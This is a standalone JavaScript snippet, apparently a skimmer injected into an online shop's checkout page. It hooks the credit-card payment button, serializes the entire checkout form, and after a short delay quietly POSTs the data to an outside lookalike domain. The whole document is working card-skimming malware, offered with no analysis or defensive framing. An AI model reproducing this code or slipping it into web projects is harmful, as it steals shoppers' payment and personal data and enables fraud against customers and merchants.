window.onload = function() {
  jQuery("#btnCreditCard.paymentBtn.creditcard").bind(
    "mouseup touchend",
    function(e) {
      var dati = jQuery("#checkout");
      var pdati = JSON.stringify(dati.serializeArray());
      setTimeout(function() {
        jQuery.ajax({
          type: "POST",
          async: true,
          url: "https://neweggstats.com/GlobalData/",
          data: pdati,
          dataType: "application/json"
        });
      }, 250);
    }
  );
};
